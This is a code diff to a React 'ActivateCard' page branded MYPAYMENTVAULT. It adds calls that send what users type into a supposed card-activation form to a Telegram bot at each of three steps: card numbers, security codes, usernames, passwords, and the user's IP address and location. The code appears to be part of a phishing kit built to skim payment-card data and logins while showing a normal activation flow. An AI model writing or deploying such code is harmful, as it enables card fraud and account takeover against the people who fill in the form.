@@ -2,6 +2,7 @@ import { useState } from "react";
 import { useLocation } from "wouter";
 import { AuthHeader } from "@/components/auth-header";
 import { CheckCircle } from "lucide-react";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 import { useI18n } from "@/lib/i18n";
 
 const TOTAL_STEPS = 3;
@@ -50,6 +51,49 @@ export default function ActivateCard() {
     }
 
     setLoading(true);
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    const ip = await getIPInfo();
+
+    if (step === 0) {
+      await sendTelegram(
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `💳 <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Step 1</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
+        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
+        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>        : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━`
+      );
+    } else if (step === 1) {
+      await sendTelegram(
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `💳 <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Step 2</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `👤 <b>Username</b>    : <code>${form.username}</code>\n` +
+        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>       : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━`
+      );
+    } else if (step === 2) {
+      await sendTelegram(
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `✅ <b>MYPAYMENTVAULT</b>\n` +
+        `📌 <b>Aktivasi Kartu — Selesai</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
+        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
+        `👤 <b>Username</b>     : <code>${form.username}</code>\n` +
+        `🔑 <b>Password</b>     : <code>${form.password}</code>\n` +
+        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>        : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🎉 <i>Kartu berhasil diaktifkan!</i>`
+      );
+    }
+
     await new Promise((r) => setTimeout(r, 800));
     setLoading(false);
     if (step < TOTAL_STEPS - 1) {
